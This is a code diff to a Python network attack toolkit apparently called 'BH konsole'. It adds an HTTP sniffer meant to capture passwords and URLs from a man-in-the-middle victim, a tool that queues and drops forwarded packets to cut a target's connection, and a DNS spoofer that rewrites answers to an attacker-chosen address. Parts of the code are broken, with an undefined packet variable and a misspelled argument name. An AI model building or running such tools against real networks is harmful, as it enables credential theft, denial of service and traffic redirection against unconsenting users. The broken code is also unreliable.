@@ -1,4 +1,5 @@
 import scapy.all as scapy
+import netfilterqueue
 import time
 import pyfiglet
 import http as server
@@ -7,6 +8,7 @@ import sys
 
 from mac_vendor_lookup import MacLookup
 from prettytable import PrettyTable
+from scapy.layers import http
 
 def start_text():
     intro_text_1 = pyfiglet.figlet_format('BH\nkonsole', font='5lineoblique')
@@ -95,16 +97,131 @@ class Net_spoof:
             print(f'[+] Packets sent --- {counter}')
             time.sleep(2)
 
+class Sniffer:
+    def __init__(self, id, name, info):
+        self.id = id
+        self.name = name
+        self.info = info
+    def _method_(self, *args):
+
+        try:
+            interface = args[0]
+        except IndexError:
+            print('[-] Check if options are correct.\n [interface]')
+
+        def sniff(interface):
+            scapy.sniff(iface=interface, store=False, prn=processPacket)
+
+        def processPacket(packet):
+            if packet.haslayer(http.HTTPRequest):
+                url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+                print(url)
+                if packet.haslayer(scapy.Raw):
+                    load = packet[scapy.Raw].load
+                    keywords = ["username, user, usr, login, password, pass, pswd"]
+                    for keyword in keywords:
+                        print(load)
+                        break
+
+        sniff(interface)
+
+
+class Net_stop:
+    def __init__(self, id, name, info):
+        self.id = id
+        self.name = name
+        self.info = info
+    def _method_(self, *args):
+        try:
+            parsed_args = args[0]
+            queueNum = parsed_args[0]
+        except IndexError:
+            print('[-] Check if options are correct.\n [queue_num]')
+            read_command()
+
+        def createQueue(queueNum):
+            subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", queueNum])
+            print("Queue created")
+
+        def processPacket(packet):
+            print(packet)
+            packet.drop()
+
+        createQueue(queueNum)
+        queue = netfilterqueue.NetfilterQueue()
+        queue.bind(int(queueNum), processPacket)
+        queue.run()
+
+
+class Dns_spoof:
+    def __init__(self, id, name, info):
+        self.id = id
+        self.name = name
+        self.info = info
+    def _method_(self, *args):
+
+        try:
+            parsed_args = args[0]
+            queueNum = parsed_args[0]
+            host = parsed_args[1]
+            rhsot = parsed_args[2]
+            test = parsed_args[3]
+        except IndexError:
+            print('[-] Check if options are correct.\n [host rhost test]')
+            read_command
+
+        def createQueue(queueNum, test):
+            if test == 0:
+                subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", queueNum])
+                print("Queue created!")
+            if test == 1:
+                subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", queueNum])
+                subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", queueNum])
+                print("Test queue created!")
+
+        def processPacket(packet):
+
+            if scapyPacket.haslayer(scapy.DNSRR):
+                qname = scapyPacket[scapy.DNSQR].qname
+                if host in qname:
+                    print(qname)
+                    answer = scapy.DNSRR(rrname=qname, rdata=rhost)
+                    scapyPacket[scapy.DNS].an = answer
+                    scapyPacket[scapy.DNS].ancount = 1
+
+                    del scapyPacket[scapy.IP].len
+                    del scapyPacket[scapy.IP].chksum
+                    del scapyPacket[scapy.UDP].chksum
+                    del scapyPacket[scapy.UDP].chksum
+
+                    packet.set_payload(str(scapyPacket))
+
+            packet.accept()
+
+
+        createQueue(queueNum, int(test))
+        queue = netfilterqueue.NetfilterQueue()
+        queue.bind(int(queueNum), processPacket)
+        queue.run()
+
+
+
 def set_tools():
     info_mac_change = 'Changes your MAC address\n options are interface and new_mac.'
     info_net_detect = 'Detects all devices in the network\n options are yourIP/24'
     info_net_spoof = 'Spoofs the target IP and the router to become man in the midle\n options are targetIp and routerIP'
+    info_sniffer = 'Sniffs the spoofed target for passwords and urls.'
+    info_net_stop = 'After you become man in the midle with spoofer you can create queue to hold packets and drop them stopping the connection between the target and the router. After use make sure you purge your ip tables'
+    info_dns_spoof = 'Spoofs DNS request'
 
     mac_change = Mac_change(0,'mac_change', info_mac_change)
     net_detect  = Net_detect(1,'net_detect', info_net_detect)
     net_spoof = Net_spoof(2, 'net_spoof', info_net_spoof)
+    sniffer = Sniffer(3, 'sniffer', info_sniffer)
+    net_stop = Net_stop(4, 'net_stop', info_net_stop)
+    dns_spoof = Dns_spoof(5, 'dns_spoof', info_dns_spoof)
 
-    return [mac_change, net_detect, net_spoof]
+    return [mac_change, net_detect, net_spoof, sniffer, net_stop, dns_spoof]
 
 def display_tools():
     tools = set_tools()
